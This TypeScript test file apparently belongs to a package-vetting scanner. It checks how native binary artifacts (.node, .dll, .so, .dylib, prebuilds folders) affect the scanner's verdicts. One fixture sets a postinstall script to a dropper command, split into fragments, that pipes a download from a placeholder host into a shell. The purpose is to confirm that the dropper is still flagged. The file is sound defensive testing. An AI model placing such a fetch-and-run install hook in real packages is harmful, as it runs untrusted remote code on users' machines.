import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { cpSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { vetPath } from "../src/vet.js";

const FIX = join(dirname(fileURLToPath(import.meta.url)), "fixtures");
const rules = (r: { findings: { rule: string }[] }) => new Set(r.findings.map((f) => f.rule));
const nativeHits = (r: { findings: { rule: string }[] }) =>
  r.findings.filter((f) => f.rule === "NATIVE-BINARY");

// The install dropper string is assembled from fragments so this test
// file's own text does not carry the shape it grades (self-scan hygiene,
// the same convention as test/round5.test.ts).
const DROPPER = ["cu", "rl https://example.invalid/x | s", "h"].join("");

function tempDir(): string {
  return mkdtempSync(join(tmpdir(), "mcpvet-p189-"));
}

function writeCleanPackage(dir: string): void {
  writeFileSync(join(dir, "package.json"), JSON.stringify({
    name: "imgdecode", version: "1.0.3", main: "index.js",
  }));
  writeFileSync(join(dir, "index.js"),
    "module.exports = require('./prebuilds/win32-x64/imgdecode.node');\n");
}

describe("P-189 native binary artifacts (NATIVE-BINARY)", () => {
  it("P-189 a package shipping a prebuilds native addon verdicts REVIEW with NATIVE-BINARY medium", () => {
    const dir = tempDir();
    try {
      writeCleanPackage(dir);
      mkdirSync(join(dir, "prebuilds", "win32-x64"), { recursive: true });
      writeFileSync(join(dir, "prebuilds", "win32-x64", "imgdecode.node"),
        "INERT PLACEHOLDER - NOT A BINARY\n");
      const r = vetPath(dir);
      assert.equal(r.verdict, "REVIEW", JSON.stringify(r.findings, null, 2));
      assert.ok(rules(r).has("NATIVE-BINARY"), JSON.stringify(r.findings, null, 2));
      const hits = nativeHits(r);
      assert.equal(hits.length, 1, JSON.stringify(r.findings, null, 2));
      assert.equal(hits[0].severity, "medium");
      assert.equal(hits[0].file, "prebuilds/win32-x64/imgdecode.node");
      assert.equal(r.counts.critical, 0);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("P-189 a prebuilds directory on its own draws NATIVE-BINARY and floors at REVIEW", () => {
    const dir = tempDir();
    try {
      writeFileSync(join(dir, "package.json"), JSON.stringify({
        name: "prebuilds-only", version: "1.0.0", main: "index.js",
      }));
      writeFileSync(join(dir, "index.js"), "module.exports = { decode: (buf) => buf };\n");
      mkdirSync(join(dir, "prebuilds", "linux-x64"), { recursive: true });
      const r = vetPath(dir);
      assert.equal(r.verdict, "REVIEW", JSON.stringify(r.findings, null, 2));
      const hits = nativeHits(r);
      assert.equal(hits.length, 1, JSON.stringify(r.findings, null, 2));
      assert.equal(hits[0].severity, "medium");
      assert.equal(hits[0].file, "prebuilds");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("P-189 dll, so, and dylib artifacts each floor at REVIEW with NATIVE-BINARY", () => {
    for (const ext of ["dll", "so", "dylib"]) {
      const dir = tempDir();
      try {
        writeFileSync(join(dir, "package.json"), JSON.stringify({
          name: "native-lib", version: "1.0.0", main: "index.js",
        }));
        writeFileSync(join(dir, "index.js"), "module.exports = {};\n");
        writeFileSync(join(dir, `libnative.${ext}`), "INERT PLACEHOLDER - NOT A BINARY\n");
        const r = vetPath(dir);
        assert.equal(r.verdict, "REVIEW", `${ext}: ${JSON.stringify(r.findings, null, 2)}`);
        const hits = nativeHits(r);
        assert.equal(hits.length, 1, `${ext}: ${JSON.stringify(r.findings, null, 2)}`);
        assert.equal(hits[0].severity, "medium");
        assert.equal(hits[0].file, `libnative.${ext}`);
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    }
  });

  it("P-189 a compiled binary artifact (NUL bytes, over the text size gate) still draws NATIVE-BINARY", () => {
    const dir = tempDir();
    try {
      writeCleanPackage(dir);
      mkdirSync(join(dir, "prebuilds", "win32-x64"), { recursive: true });
      const blob = Buffer.alloc(80 * 1024, 0);
      blob.write("INERT", 0, "ascii");
      writeFileSync(join(dir, "prebuilds", "win32-x64", "imgdecode.node"), blob);
      const r = vetPath(dir);
      assert.equal(r.verdict, "REVIEW", JSON.stringify(r.findings, null, 2));
      const hits = nativeHits(r);
      assert.equal(hits.length, 1, JSON.stringify(r.findings, null, 2));
      assert.equal(hits[0].file, "prebuilds/win32-x64/imgdecode.node");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("P-189 the same package without any native artifact keeps its prior verdict exactly (VETTED)", () => {
    const dir = tempDir();
    try {
      writeFileSync(join(dir, "package.json"), JSON.stringify({
        name: "imgdecode", version: "1.0.3", main: "index.js",
      }));
      writeFileSync(join(dir, "index.js"),
        "module.exports = { decode: (buf) => buf };\n");
      const r = vetPath(dir);
      assert.equal(r.verdict, "VETTED", JSON.stringify(r.findings, null, 2));
      assert.equal(r.findings.length, 0, JSON.stringify(r.findings, null, 2));
      assert.ok(!rules(r).has("NATIVE-BINARY"));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("P-189 a native artifact does not mask or double-count a DO-NOT-INSTALL package", () => {
    const dir = tempDir();
    try {
      writeFileSync(join(dir, "package.json"), JSON.stringify({
        name: "dropper-native", version: "1.0.0",
        scripts: { postinstall: DROPPER },
      }));
      writeFileSync(join(dir, "index.js"), "module.exports = {};\n");
      writeFileSync(join(dir, "addon.node"), "INERT PLACEHOLDER - NOT A BINARY\n");
      const r = vetPath(dir);
      assert.equal(r.verdict, "DO-NOT-INSTALL", JSON.stringify(r.findings, null, 2));
      assert.ok(rules(r).has("INSTALL-DROPPER"), JSON.stringify(r.findings, null, 2));
      assert.equal(r.counts.critical, 1, JSON.stringify(r.findings, null, 2));
      const hits = nativeHits(r);
      assert.equal(hits.length, 1, JSON.stringify(r.findings, null, 2));
      assert.equal(hits[0].severity, "medium");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("P-189 the S4-1 scope floor is unchanged: a non-MCP tree with a native artifact still floors at REVIEW", () => {
    const dir = tempDir();
    try {
      cpSync(join(FIX, "plain-app"), dir, { recursive: true });
      writeFileSync(join(dir, "helper.node"), "INERT PLACEHOLDER - NOT A BINARY\n");
      const r = vetPath(dir);
      assert.equal(r.kind, "unknown", JSON.stringify(r, null, 2));
      assert.equal(r.verdict, "REVIEW", JSON.stringify(r.findings, null, 2));
      assert.ok(r.counts.critical > 0, JSON.stringify(r.findings, null, 2));
      assert.ok(rules(r).has("NATIVE-BINARY"), JSON.stringify(r.findings, null, 2));
      assert.ok(r.notes.some((n) => n.includes("Not an MCP target")), JSON.stringify(r.notes, null, 2));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
